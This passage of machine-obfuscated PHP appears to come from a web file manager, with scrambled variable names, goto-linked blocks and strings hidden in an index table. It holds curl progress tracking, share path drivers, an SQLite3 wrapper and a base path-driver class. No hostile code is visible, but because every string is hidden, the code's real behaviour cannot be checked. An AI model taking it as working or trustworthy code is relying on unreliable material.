sourceRemove($Ê¥Öñ·¡, $‚ú’§ğ®) { $‚õ™å¸Ã =& $_SERVER[ˆûùúÊ¯]; $this->sourceModelCopyFlag = !0; $œ•µè€ = 1; if (isset($Ê¥Öñ·¡[$‚õ™å¸Ã[89]])) { $œ•µè€ = $Ê¥Öñ·¡[$‚õ™å¸Ã[89]][$‚õ™å¸Ã[87]]; $œ•µè€ = $œ•µè€ + $Ê¥Öñ·¡[$‚õ™å¸Ã[89]][$‚õ™å¸Ã[88]] + 1; } $this->update($œ•µè€); $this->sourceModelCopyFlag = !1; } public function sourceMove($ŠÊÔÎ§Û) { $this->sourceRemove($ŠÊÔÎ§Û, !1); } public function curlProgress($Ÿ‘ˆ‹ù­, $ªçºÙù², $Åœ‹´•—, $–³ãºä, $í¦·Ê‚Ö) { $¾õê¦İĞ =& $_SERVER[ˆûùúÊ¯]; $Òò÷œùß =& $this->task; if ($í¦·Ê‚Ö > 0) { $Òò÷œùß[$¾õê¦İĞ[1125]] = $¾õê¦İĞ[1777]; $Òò÷œùß[$¾õê¦İĞ[1759]] = $¾õê¦İĞ[117]; if ($Òò÷œùß[$¾õê¦İĞ[1757]]) { $Òò÷œùß[$¾õê¦İĞ[1758]] = $í¦·Ê‚Ö; } if ($Òò÷œùß[$¾õê¦İĞ[1760]]) { $Òò÷œùß[$¾õê¦İĞ[1758]] = $í¦·Ê‚Ö + $Òò÷œùß[$¾õê¦İĞ[1760]]; } } else { if ($Åœ‹´•— > 0) { if ($Òò÷œùß[$¾õê¦İĞ[1757]] == $ªçºÙù²) { $Òò÷œùß[$¾õê¦İĞ[1758]] = $Åœ‹´•—; $Òò÷œùß[$¾õê¦İĞ[1125]] = $¾õê¦İĞ[1778]; $Òò÷œùß[$¾õê¦İĞ[1759]] = $¾õê¦İĞ[1255]; } } } $this->update(); } public function curlProgressStart($¿¼¡Ñ¤) { } public function curlProgressEnd($Õ÷ˆôÃö) { $ññáµšÅ =& $_SERVER[ˆûùúÊ¯]; $®Êü =& $this->task; $¿ß† = curl_getinfo($Õ÷ˆôÃö); $é£¨é ¾ = $¿ß†[$ññáµšÅ[1779]]; if ($é£¨é ¾ == -1) { $é£¨é ¾ = $¿ß†[$ññáµšÅ[1780]]; } if ($®Êü[$ññáµšÅ[1759]] == $ññáµšÅ[117] && $é£¨é ¾) { $®Êü[$ññáµšÅ[1760]] += $é£¨é ¾; } $this->update(); } } goto CÉ•–«ãâ; BÆêŞ†ƒÇ‘: class PathDriverDbShareItem extends PathDriverDB { public function __construct($¬†—ò¯Ï) { $this->pathParse = $¬†—ò¯Ï; $this->model = Model($_SERVER[ˆûùúÊ¯][1393]); } public function getPathOuter($ÉèŠêÏş) { $±–éĞº =& $_SERVER[ˆûùúÊ¯]; if (!$ÉèŠêÏş) { return $ÉèŠêÏş; } $ÎéÌš•Ï = $this->parse($ÉèŠêÏş); return trim(KodIO::makeShare($this->pathParse[$±–éĞº[451]], $ÎéÌš•Ï[$±–éĞº[451]]), $±–éĞº[8]); } protected function infoParse($ÆÀœ…®İ, $…«©£®Ú = false, $¸äß‡Ò› = false) { $Ÿ±¹ä² =& $_SERVER[ˆûùúÊ¯]; $Ÿ–Â¸… = $this->pathParse[$Ÿ±¹ä²[451]]; $‘²ï®³œ = trim($this->pathParse[$Ÿ±¹ä²[1229]], $Ÿ±¹ä²[8]); return Action($Ÿ±¹ä²[1400])->sharePathInfo($Ÿ–Â¸…, $‘²ï®³œ, $…«©£®Ú); } public function infoFull($Çì¤¯») { $Œ‡±´é² =& $_SERVER[ˆûùúÊ¯]; $¸‰î¾ä´ = explode($Œ‡±´é²[8], trim($Çì¤¯», $Œ‡±´é²[8])); if (count($¸‰î¾ä´) > 1) { $¿á—·×ë = implode($Œ‡±´é²[8], array_splice($¸‰î¾ä´, 1)); $œÚ«ƒ…Š = $this->model->pathInfoByPath($¸‰î¾ä´[0], $¿á—·×ë); if (!$œÚ«ƒ…Š) { return !1; } $this->pathParse[$Œ‡±´é²[1229]] = $œÚ«ƒ…Š[$Œ‡±´é²[190]]; } return $this->infoParse($Çì¤¯»); } public function listAll($ºŞ÷œŠİ) { $„Ò¢ˆ‘Ğ =& $_SERVER[ˆûùúÊ¯]; $ø¥û½š— = IO::info($this->pathParse[$„Ò¢ˆ‘Ğ[94]]); if (!$ø¥û½š—) { return array(); } $»ûá›§™ = $this->model->listAll($ºŞ÷œŠİ); $óô«ãİŒ = Model($„Ò¢ˆ‘Ğ[640])->getInfo($ø¥û½š—[$„Ò¢ˆ‘Ğ[641]]); foreach ($»ûá›§™ as &$€Â°´Äé) { check_abort(); $€Â°´Äé[$„Ò¢ˆ‘Ğ[97]] = Action($„Ò¢ˆ‘Ğ[1400])->_shareItemeParse($€Â°´Äé[$„Ò¢ˆ‘Ğ[97]], $óô«ãİŒ); } unset($€Â°´Äé); return $»ûá›§™; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÚÎî¡•Ÿ) { $this->pathParse = $ÚÎî¡•Ÿ; $this->model = Model($_SERVER[ˆûùúÊ¯][1393]); } protected function infoParse($¡¸ûèŒ, $™ø¦ûñÃ = false, $ÚæƒíÓ = false) { $ï ¶·Ê =& $_SERVER[ˆûùúÊ¯]; return Action($ï ¶·Ê[1235])->sharePathInfo($this->pathParse[$ï ¶·Ê[94]], !0, $™ø¦ûñÃ); } public function listPath($áŠØ, $²µŸÏËî = false) { $±í˜Öæğ =& $_SERVER[ˆûùúÊ¯]; $ŒñêüÑ™ = parent::listPath($áŠØ, $²µŸÏËî); if (!$ŒñêüÑ™) { return $ŒñêüÑ™; } if (is_array($ŒñêüÑ™[$±í˜Öæğ[1401]])) { $ŒñêüÑ™[$±í˜Öæğ[1401]] = Action($±í˜Öæğ[1235])->shareItemInfo($ŒñêüÑ™[$±í˜Öæğ[1401]]); } foreach ($ŒñêüÑ™ as $ñÒäÀİ => $°û„á¹„) { if (!in_array($ñÒäÀİ, array($±í˜Öæğ[93], $±í˜Öæğ[92]))) { continue; } foreach ($°û„á¹„ as $™Ä¢¥È => $Á—Ô›ï½) { $ŒñêüÑ™[$ñÒäÀİ][$™Ä¢¥È] = Action($±í˜Öæğ[1235])->shareItemInfo($Á—Ô›ï½); } } return $ŒñêüÑ™; } public function listAll($ó¿ƒ¥ªŒ) { $Ñ”Ö¨±‚ =& $_SERVER[ˆûùúÊ¯]; $­ÌÂÚˆ = IO::info($this->pathParse[$Ñ”Ö¨±‚[94]]); if (!$­ÌÂÚˆ) { return array(); } $Îì¶ºäö = $this->model->listAll($ó¿ƒ¥ªŒ); foreach ($Îì¶ºäö as &$°¨’¯èË) { $°¨’¯èË[$Ñ”Ö¨±‚[97]] = Action($Ñ”Ö¨±‚[1235])->shareItemInfo($°¨’¯èË[$Ñ”Ö¨±‚[97]]); } unset($°¨’¯èË); return $Îì¶ºäö; } } class PathDriverDriverShareItem { public function __construct($¬ÄÏ¯ÏÕ) { $this->pathParse = $¬ÄÏ¯ÏÕ; } public function __call($¸çÈÅö, $°ò´×Ì®) { $îĞµİæš =& $_SERVER[ˆûùúÊ¯]; if (method_exists($this, $¸çÈÅö)) { return; } $îÙìˆ’û = call_user_func_array(array($îĞµİæš[1402], $¸çÈÅö), $°ò´×Ì®); $–•²¶ì€ = array($îĞµİæš[1403], $îĞµİæš[1404], $îĞµİæš[1405], $îĞµİæš[1406], $îĞµİæš[594], $îĞµİæš[596], $îĞµİæš[1407], $îĞµİæš[117], $îĞµİæš[1408], $îĞµİæš[1409]); if (in_array($¸çÈÅö, $–•²¶ì€)) { $îÙìˆ’û = $this->getPathOuter($îÙìˆ’û); } return $îÙìˆ’û; } public function copy($óÁÈ¹Ä›, $Å›±ÛÉ•, $ğë’³ÊŒ = false, $Å¤Óç†Ñ = false) { return $this->copyMove($óÁÈ¹Ä›, $Å›±ÛÉ•, $ğë’³ÊŒ, $_SERVER[ˆûùúÊ¯][594], $Å¤Óç†Ñ); } public function move($¿À¨ÀÊ, $—•‡Òæ, $¶¼¹££ = false, $Èæ«ùŠÕ = false) { return $this->copyMove($¿À¨ÀÊ, $—•‡Òæ, $¶¼¹££, $_SERVER[ˆûùúÊ¯][596], $Èæ«ùŠÕ); } private function copyMove($°ÑÖÀö¬, $ºæ¹‰, $“§ãÅŒ, $çŠ˜¢¼, $›ÏÒ÷ÇÚ = false) { $å¦âõëê =& $_SERVER[ˆûùúÊ¯]; $ÏğÒßï = $ºæ¹‰; $Ğ¦Çç’“ = IO::driverMake($ºæ¹‰); if ($Ğ¦Çç’“->pathParse[$å¦âõëê[1212]]) { $ºæ¹‰ = $Ğ¦Çç’“->pathParse[$å¦âõëê[1212]]; } else { $ºæ¹‰ = $ÏğÒßï; } $¶ÚÑ…ƒÜ = IO::copyMove($°ÑÖÀö¬, $ºæ¹‰, $“§ãÅŒ, $çŠ˜¢¼, $›ÏÒ÷ÇÚ); $¶ÚÑ…ƒÜ = $this->getPathOuter($¶ÚÑ…ƒÜ); return $¶ÚÑ…ƒÜ; } public function pathThis($å§«€ÂÃ) { return get_path_this($this->pathParse[$_SERVER[ˆûùúÊ¯][94]]); } public function pathFather($œ®İÏ‘Ù) { return get_path_father($this->pathParse[$_SERVER[ˆûùúÊ¯][94]]); } public function iconvSystem($¥ºï²Ä¥) { return $¥ºï²Ä¥; } protected function infoParse($ä¥¾Îà, $Á—ğ¬šš = false) { $½ìˆºª¬ =& $_SERVER[ˆûùúÊ¯]; $íœí¤’ = $this->pathParse[$½ìˆºª¬[536]][$½ìˆºª¬[1236]] . $this->pathParse[$½ìˆºª¬[1229]]; if ($Á—ğ¬šš) { $ºæ€€£ö = IO::infoWithChildren($íœí¤’); } else { $ºæ€€£ö = IO::info($íœí¤’); } $ƒ£ûŸ = $this->pathParse[$½ìˆºª¬[536]]; return Action($½ìˆºª¬[1400])->_shareItemeParse($ºæ€€£ö, $ƒ£ûŸ); } public function listAll($ˆÙˆ¸×‚) { $¨¤ÍÙ®Ù =& $_SERVER[ˆûùúÊ¯]; $ôÀ ©íé = IO::listAll($ˆÙˆ¸×‚); $…êÆçØ© = rtrim($this->pathParse[$¨¤ÍÙ®Ù[536]][$¨¤ÍÙ®Ù[1236]], $¨¤ÍÙ®Ù[8]); foreach ($ôÀ ©íé as &$Œ“ÛĞ¡‘) { $Œ“ÛĞ¡‘[$¨¤ÍÙ®Ù[94]] = $this->pathDriver . $¨¤ÍÙ®Ù[8] . ltrim(substr($Œ“ÛĞ¡‘[$¨¤ÍÙ®Ù[94]], strlen($…êÆçØ©)), $¨¤ÍÙ®Ù[8]); } unset($Œ“ÛĞ¡‘); return $ôÀ ©íé; } public function listAllSimple($öõÂìøü, $³ şßşµ = false) { $â„šôÏÖ =& $_SERVER[ˆûùúÊ¯]; $úĞæŒ§° = $this->listAll($öõÂìøü); $Âù”ßÖÈ = $this->pathParse[$â„šôÏÖ[471]]; if (trim($Âù”ßÖÈ, $â„šôÏÖ[8]) == trim(get_path_father($Âù”ßÖÈ), $â„šôÏÖ[8])) { $³ şßşµ = !0; } return IO::init($â„šôÏÖ[12])->listAllSimpleMake($úĞæŒ§°, $Âù”ßÖÈ, $³ şßşµ); } public function getPathOuter($ì¹‰×Ì) { $×ÛŠ®ãÜ =& $_SERVER[ˆûùúÊ¯]; $´”’«»ô = KodIO::parse($ì¹‰×Ì); if ($´”’«»ô[$×ÛŠ®ãÜ[43]] == KodIO::KOD_SHARE_ITEM) { return $´”’«»ô[$×ÛŠ®ãÜ[94]]; } $©¹¾¸àæ = KodIO::clear($ì¹‰×Ì); $‚şÎ±“¹ = KodIO::clear($this->pathParse[$×ÛŠ®ãÜ[536]][$×ÛŠ®ãÜ[1236]]); $áâÅÅ÷è = substr($©¹¾¸àæ, strlen($‚şÎ±“¹)); if (substr($©¹¾¸àæ, 0, strlen($‚şÎ±“¹)) != $‚şÎ±“¹) { return !1; } return $this->pathParse[$×ÛŠ®ãÜ[1230]] . $×ÛŠ®ãÜ[8] . ltrim($áâÅÅ÷è, $×ÛŠ®ãÜ[8]); } public function getType() { $ÚšÂ¾¡ =& $_SERVER[ˆûùúÊ¯]; $ØÖİû’ = str_replace($ÚšÂ¾¡[84], $ÚšÂ¾¡[12], get_class($this)); return strtolower($ØÖİû’); } public function isTypeObject($×˜™£Ô) { return IO::isTypeObject($×˜™£Ô); } public function info($çş…€ÀÏ) { return $this->infoParse($çş…€ÀÏ); } public function infoAuth($¶ç¢¬ Ä) { return $this->infoParse($¶ç¢¬ Ä); } public function infoWithChildren($öÇ§ùêÏ) { return $this->infoParse($öÇ§ùêÏ, !0); } public function infoFull($ûç„¥‡ò) { return $this->infoParse($ûç„¥‡ò); } } goto A‰­à»å‹„; c‘“‡ŒëÀ„: class DbSqlite3Base extends Db { public function __construct($è¸èş = '') { $ôû¦¹½ =& $_SERVER[ˆûùúÊ¯]; if (!class_exists($ôû¦¹½[64])) { think_exception(think_lang($ôû¦¹½[24]) . $ôû¦¹½[65]); } if (!empty($è¸èş)) { if (!isset($è¸èş[$ôû¦¹½[26]])) { $è¸èş[$ôû¦¹½[26]] = 438; } $this->config = $è¸èş; if (empty($this->config[$ôû¦¹½[27]])) { $this->config[$ôû¦¹½[27]] = array(); } } } public function connect($ŒÕÉí¯Ú = '', $¶Ğó…Óº = 0) { $–ÆÜ‚ùñ =& $_SERVER[ˆûùúÊ¯]; if (!isset($this->linkID[$¶Ğó…Óº])) { if (empty($ŒÕÉí¯Ú)) { $ŒÕÉí¯Ú = $this->config; } $this->linkID[$¶Ğó…Óº] = new SQLite3($ŒÕÉí¯Ú[$–ÆÜ‚ùñ[31]]); if (!$this->linkID[$¶Ğó…Óº]) { think_exception($this->linkID[$¶Ğó…Óº]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$¶Ğó…Óº]->busyTimeout(30000); if (1 != think_config($–ÆÜ‚ùñ[32])) { unset($this->config); } } return $this->linkID[$¶Ğó…Óº]; } public function free() { $this->queryID = null; } public function query($»µí·¦İ) { $ ôá¾±¨ =& $_SERVER[ˆûùúÊ¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $»µí·¦İ; if ($this->queryID) { $this->free(); } think_action_status($ ôá¾±¨[33], 1); think_status($ ôá¾±¨[34]); $this->queryID = $this->_linkID->query($»µí·¦İ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $´ÙÊœı­ = $this->getAll(); $this->numRows = count($´ÙÊœı­); return $´ÙÊœı­; } } public function execute($“‡éˆ) { $×ì’Ï =& $_SERVER[ˆûùúÊ¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $“‡éˆ; if ($this->queryID) { $this->free(); } think_action_status($×ì’Ï[35], 1); think_status($×ì’Ï[34]); $Õ€Õ¨àÅ = $this->_linkID->exec($“‡éˆ); $this->debug(); if (!1 === $Õ€Õ¨àÅ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ˆûùúÊ¯][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ì¶æËÒ = $this->_linkID->query($_SERVER[ˆûùúÊ¯][37]); if (!$Ì¶æËÒ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¯Œ½©£… = $this->_linkID->query($_SERVER[ˆûùúÊ¯][38]); if (!$¯Œ½©£…) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ôÙëĞ†Ë = array(); while ($’“Ùæó = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ôÙëĞ†Ë[] = $’“Ùæó; } $this->queryID->reset(); return $ôÙëĞ†Ë; } public function getFields($çÂ€ù©ˆ) { $“ş·£·³ =& $_SERVER[ˆûùúÊ¯]; $ÃÑÇ‚µ± = $this->query($“ş·£·³[39] . $çÂ€ù©ˆ . $“ş·£·³[40]); $›»Î¦ªŒ = array(); if ($ÃÑÇ‚µ±) { foreach ($ÃÑÇ‚µ± as $Ãğ–‰À => $‡ÚşŞÊÚ) { $›»Î¦ªŒ[$‡ÚşŞÊÚ[$“ş·£·³[42]]] = array($“ş·£·³[42] => $‡ÚşŞÊÚ[$“ş·£·³[42]], $“ş·£·³[43] => $‡ÚşŞÊÚ[$“ş·£·³[43]], $“ş·£·³[45] => (bool) ($‡ÚşŞÊÚ[$“ş·£·³[45]] === $“ş·£·³[12]), $“ş·£·³[47] => $‡ÚşŞÊÚ[$“ş·£·³[66]], $“ş·£·³[49] => (bool) $‡ÚşŞÊÚ[$“ş·£·³[67]], $“ş·£·³[52] => (bool) $‡ÚşŞÊÚ[$“ş·£·³[67]]); } } return $›»Î¦ªŒ; } public function getTables($»Óóßãê = '') { $™ìô—õ± =& $_SERVER[ˆûùúÊ¯]; $ƒôÄ•š« = $this->query($™ìô—õ±[55] . $™ìô—õ±[56] . $™ìô—õ±[57]); $èë‹Ş¹² = array(); foreach ($ƒôÄ•š« as $˜ôÊíö¬ => $µ³ûÃû) { $èë‹Ş¹²[$˜ôÊíö¬] = current($µ³ûÃû); } return $èë‹Ş¹²; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ê‡ÜÃ§µ =& $_SERVER[ˆûùúÊ¯]; $this->error = $this->_linkID->lastErrorMsg(); if ($ê‡ÜÃ§µ[12] != $this->queryStr) { $this->error .= LNG($ê‡ÜÃ§µ[58]) . $this->queryStr; } think_trace($this->error, $ê‡ÜÃ§µ[12], $ê‡ÜÃ§µ[59]); return $this->error; } public function escapeString($ˆ³…Ì–—) { $¡îõõ¶ =& $_SERVER[ˆûùúÊ¯]; if ($this->_linkID) { return $this->_linkID->escapeString($ˆ³…Ì–—); } return str_ireplace($¡îõõ¶[68], $¡îõõ¶[69], $ˆ³…Ì–—); } public function parseLimit($ı¥Ï Ïã) { $í  ß’‚ =& $_SERVER[ˆûùúÊ¯]; $´¡á¬Ë = $í  ß’‚[12]; if (!empty($ı¥Ï Ïã)) { $ı¥Ï Ïã = explode($í  ß’‚[60], $ı¥Ï Ïã); if (count($ı¥Ï Ïã) > 1) { $´¡á¬Ë .= $í  ß’‚[61] . $ı¥Ï Ïã[1] . $í  ß’‚[62] . $ı¥Ï Ïã[0] . $í  ß’‚[63]; } else { $´¡á¬Ë .= $í  ß’‚[61] . $ı¥Ï Ïã[0] . $í  ß’‚[63]; } } return $´¡á¬Ë; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ñÓ‘¥éÑ =& $_SERVER[ˆûùúÊ¯]; $this->objectDriver = array($ñÓ‘¥éÑ[70], $ñÓ‘¥éÑ[71], $ñÓ‘¥éÑ[72], $ñÓ‘¥éÑ[73], $ñÓ‘¥éÑ[74], $ñÓ‘¥éÑ[75], $ñÓ‘¥éÑ[76], $ñÓ‘¥éÑ[77], $ñÓ‘¥éÑ[78]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($™·¸…³š) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($™·¸…³š, $_SERVER[ˆûùúÊ¯][8]); } return $™·¸…³š; } public function iconvApp($ç¦è³¦€) { return $ç¦è³¦€; } public function iconvSystem($«Â«‘Áó) { return $«Â«‘Áó; } public function iconvTo($Íî£Œ¢„, $Û§óÎæö, $…‘í£µÊ) { $€Áˆ…‡Ì =& $_SERVER[ˆûùúÊ¯]; if (!$Íî£Œ¢„ || !function_exists($€Áˆ…‡Ì[79])) { return $Íî£Œ¢„; } static $‘ÏùÚšİ = array(); $¸ºşÖ×¸ = $Û§óÎæö . $€Áˆ…‡Ì[80] . $…‘í£µÊ . $€Áˆ…‡Ì[81] . $Íî£Œ¢„; if (isset($‘ÏùÚšİ[$¸ºşÖ×¸])) { return $‘ÏùÚšİ[$¸ºşÖ×¸]; } if (function_exists($€Áˆ…‡Ì[82])) { $Ô€Ë…“± = @mb_convert_encoding($Íî£Œ¢„, $…‘í£µÊ, $Û§óÎæö); } else { $Ô€Ë…“± = @iconv($Û§óÎæö, $…‘í£µÊ, $Íî£Œ¢„); } $Ô€Ë…“± = $Ô€Ë…“± ? $Ô€Ë…“± : $Íî£Œ¢„; if (strstr($Ô€Ë…“±, $€Áˆ…‡Ì[83])) { $Ô€Ë…“± = str_replace($€Áˆ…‡Ì[83], $€Áˆ…‡Ì[11], $Ô€Ë…“±); } $‘ÏùÚšİ[$Û§óÎæö . $€Áˆ…‡Ì[80] . $…‘í£µÊ . $€Áˆ…‡Ì[81] . $Íî£Œ¢„] = $Ô€Ë…“±; $‘ÏùÚšİ[$…‘í£µÊ . $€Áˆ…‡Ì[80] . $Û§óÎæö . $€Áˆ…‡Ì[81] . $Íî£Œ¢„] = $Íî£Œ¢„; $‘ÏùÚšİ[$…‘í£µÊ . $€Áˆ…‡Ì[80] . $Û§óÎæö . $€Áˆ…‡Ì[81] . $Ô€Ë…“±] = $Íî£Œ¢„; $‘ÏùÚšİ[$Û§óÎæö . $€Áˆ…‡Ì[80] . $…‘í£µÊ . $€Áˆ…‡Ì[81] . $Ô€Ë…“±] = $Ô€Ë…“±; return $Ô€Ë…“±; } public function getPathInner($åÄ—„Û„) { $˜ûøŠÈÚ = IO::init($åÄ—„Û„); return $˜ûøŠÈÚ->path; } public function getPathOuter($µÚá¨£–) { $•øêĞŞŠ =& $_SERVER[ˆûùúÊ¯]; $¸É­ = strlen(trim($this->pathBase, $•øêĞŞŠ[8])); $µÚá¨£– = substr(trim($µÚá¨£–, $•øêĞŞŠ[8]), $¸É­); return $this->pathDriver . $•øêĞŞŠ[8] . ltrim($µÚá¨£–, $•øêĞŞŠ[8]); } public function isParentOf($èí±œß, $üÕ‡¢Ô¿) { $äá³îˆı =& $_SERVER[ˆûùúÊ¯]; $èí±œß = rtrim(strtolower($èí±œß), $äá³îˆı[8]) . $äá³îˆı[8]; $üÕ‡¢Ô¿ = rtrim(strtolower($üÕ‡¢Ô¿), $äá³îˆı[8]) . $äá³îˆı[8]; $æßç¬ô = strpos($üÕ‡¢Ô¿, $èí±œß) === 0; return $æßç¬ô; } public function getType() { $úµÒÎû =& $_SERVER[ˆûùúÊ¯]; $Î¸„åß = str_replace($úµÒÎû[84], $úµÒÎû[12], get_class($this)); return strtolower($Î¸„åß); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($î–âô¢é, $¸²Ç¨Ò) { $Íİùş¹œ =& $_SERVER[ˆûùúÊ¯]; $‘óò½‚Œ = rtrim($î–âô¢é, $Íİùş¹œ[8]) . $Íİùş¹œ[8] . $¸²Ç¨Ò; $á¢œï = $this->exist($‘óò½‚Œ); return $á¢œï ? $‘óò½‚Œ : !1; } public function setModifyTime($óÏ÷õÂ, $øÌê°Ê = '') { } public function renameObject($Šóµ›÷õ, $§Èâ²–®) { $Ş™ÚÒ™Á = $§Èâ²–®; $Šóµ›÷õ = $this->getPathOuter($Šóµ›÷õ); $§Èâ²–® = $this->pathFather($Šóµ›÷õ) . $§Èâ²–®; $õĞĞõÏ” = IO::copy($Šóµ›÷õ, $this->pathFather($Šóµ›÷õ), REPEAT_RENAME_FOLDER, $Ş™ÚÒ™Á); if ($õĞĞõÏ”) { IO::remove($Šóµ›÷õ); } return $õĞĞõÏ” ? $§Èâ²–® : !1; } public function tempFile($ÁîË¡½Ú = '', $Õ¹¸øêŒ = '') { if (!$ÁîË¡½Ú) { $ÁîË¡½Ú = rand_string(15); } $ï³º†Š× = TEMP_FILES . rand_string(15) . $_SERVER[ˆûùúÊ¯][8]; @mkdir($ï³º†Š×, DEFAULT_PERRMISSIONS, !0); $óáì«€Ô = $ï³º†Š× . $ÁîË¡½Ú; @touch($óáì«€Ô); if ($Õ¹¸øêŒ) { file_put_contents($óáì«€Ô, $Õ¹¸øêŒ); } return $óáì«€Ô; } public function tempFileRemve($äµ­ŞÚ) { @unlink($äµ­ŞÚ); @rmdir($this->pathFather($äµ­ŞÚ)); } public function mkfile($ş®Ò„…Ò, $¥³ä¼ü = '', $À°‹à•Ï = REPEAT_RENAME) { } public function mkdir($—·Í×, $Ïı¾°‹Ã = REPEAT_SKIP) { } public function delFile($ˆ³ùÆ—Ó) { } public function delFolder($ÖÍ£‡Í ) { } public function copyFile($¯§ùµ¡İ, $ö°÷ÎîÜ) { } public function moveFile($ÑÁÀ–Ø¢, $Ñ½éŸãì) { } public function remove($Ù÷ü”ëú) { if ($this->isFile($Ù÷ü”ëú)) { return $this->delFile($Ù÷ü”ëú); } return $this->delFolder($Ù÷ü”ëú); } public function rename($öç”ÔÃ«, $Êæàó—É) { } public function exist($İ©øš³¬) { } public function findByHash($ÖšêØ´‹ = '', $¢Ó€’öø = '') { return !1; } public function isFile($…ÜÖ£ùİ) { } public function isFolder($Íî™ÖÔŠ) { } public function size($¶ú£Ú•æ) { } public function info($ÖÆíù­) { } public function infoSimple($û’·»¥) { return $this->info($û’·»¥); } public function infoAuth($ÛŒ“åİš) { return $this->info($ÛŒ“åİš); } public function infoFull($ıÍ†¾’) { return $this->info($ıÍ†¾’); } public function infoFullSimple($ÜÒ¢¾ô) { return $this->info($ÜÒ¢¾ô); } public function infoWithChildren($±ŞØÆİ¥) { $óıï¶üª =& $_SERVER[ˆûùúÊ¯]; static $ÖÅå´€ = array(); if (isset($ÖÅå´€[$±ŞØÆİ¥])) { return $ÖÅå´€[$±ŞØÆİ¥]; } $ìªˆ© = $this->info($±ŞØÆİ¥); if ($ìªˆ© && $ìªˆ©[$óıï¶üª[43]] == $óıï¶üª[85]) { $õ¢¡Ä§£ = array($óıï¶üª[86] => 0, $óıï¶üª[87] => 0, $óıï¶üª[88] => 0); $this->infoChildren($±ŞØÆİ¥, $õ¢¡Ä§£); $ìªˆ©[$óıï¶üª[86]] = $õ¢¡Ä§£[$óıï¶üª[86]]; $ìªˆ©[$óıï¶üª[89]] = array($óıï¶üª[90] => $õ¢¡Ä§£[$óıï¶üª[87]], $óıï¶üª[91] => $õ¢¡Ä§£[$óıï¶üª[88]]); $ÖÅå´€[$±ŞØÆİ¥] = $ìªˆ©; } return $ìªˆ©; } public function listPath($œúÚ’¯Ä, $¥éñØ = false) { } public function has($É«¨³š¾, $óË‡Ûêà = false, $”ù±ÎÄ = false) { } public function canRead($‹”ºå¦) { } public function canWrite($‚®¦‡ò‰) { } public function getContent($¢§°ËÎ) { } public function setContent($úú™«İ’, $ÌˆİÊ—ì = '') { } protected function infoChildren($°Âà¯¢ü, &$‘§Ùù) { $ì‰©Á´ =& $_SERVER[ˆûùúÊ¯]; check_abort_echo(); $ãî¿â¡ = $this->listPath($°Âà¯¢ü, !0); $ãî¿â¡ = array_merge($ãî¿â¡[$ì‰©Á´[92]], $ãî¿â¡[$ì‰©Á´[93]]); foreach ($ãî¿â¡ as $ØËÇóãŒ) { if ($ØËÇóãŒ[$ì‰©Á´[43]] == $ì‰©Á´[85]) { $‘§Ùù[$ì‰©Á´[88]]++; $Ø©¸ÒĞ™ = $this->getPathInner($ØËÇóãŒ[$ì‰©Á´[94]]); $this->infoChildren($Ø©¸ÒĞ™, $‘§Ùù); } else { $‘§Ùù[$ì‰©Á´[87]]++; $‘§Ùù[$ì‰©Á´[86]] += $ØËÇóãŒ[$ì‰©Á´[86]]; } } } public function fileSubstr($‚Œèñß¥, $¿ËÔÉØ¥, $ì¿áÁĞç) { } public function listAll($¶ÉşêêÉ) { } public function listAllMake($àà­Äİ”, &$‹ı€Á÷) { $¾„ìà‰ƒ =& $_SERVER[ˆûùúÊ¯]; check_abort_echo(); $ì¨Á—âÕ = $this->listPath($àà­Äİ”, !0); if (!$ì¨Á—âÕ) { return; } $ ß‹Ã–¹ = array_merge($ì¨Á—âÕ[$¾„ìà‰ƒ[92]], $ì¨Á—âÕ[$¾„ìà‰ƒ[93]]); foreach ($ ß‹Ã–¹ as $¼»±Ô’Ë) { $—ÈñìÏë = $¼»±Ô’Ë[$¾„ìà‰ƒ[43]] == $¾„ìà‰ƒ[85]; $”Öû®ï³ = array($¾„ìà‰ƒ[94] => $¼»±Ô’Ë[$¾„ìà‰ƒ[94]], $¾„ìà‰ƒ[85] => $—ÈñìÏë); if (isset($¼»±Ô’Ë[$¾„ìà‰ƒ[86]])) { $”Öû®ï³[$¾„ìà‰ƒ[86]] = $¼»±Ô’Ë[$¾„ìà‰ƒ[86]]; } if (isset($¼»±Ô’Ë[$¾„ìà‰ƒ[95]])) { $”Öû®ï³[$¾„ìà‰ƒ[95]] = $¼»±Ô’Ë[$¾„ìà‰ƒ[95]]; } if (!$—ÈñìÏë) { $‹ı€Á÷[] = $”Öû®ï³; continue; } $‹ı€Á÷[] = $”Öû®ï³; $Õ¨¹šé = $¼»±Ô’Ë[$¾„ìà‰ƒ[94]]; $´½Ëí²ç = $this->pathDriver; if (substr($¼»±Ô’Ë[$¾„ìà‰ƒ[94]], 0, strlen($´½Ëí²ç)) == $´½Ëí²ç) { $Õ¨¹šé = substr($Õ¨¹šé, strlen($´½Ëí²ç)); } $this->listAllMake($Õ¨¹šé, $‹ı€Á÷); } } public function listAllSimple($¼òÂæ‚Ã, $¿¦Á“í› = false) { $Ïú´Ç®È = $this->listAll($¼òÂæ‚Ã); return $this->listAllSimpleMake($Ïú´Ç®È, $this->getPathOuter($¼òÂæ‚Ã), $¿¦Á“í›); } public function listAllSimpleMake($˜ÓÖíİÒ, $™äèÙ‚Â, $ÛªÀ¥ê™) { $üóƒˆÀ =& $_SERVER[ˆûùúÊ¯]; $‡á›Ã–– = array(); $™äèÙ‚Â = 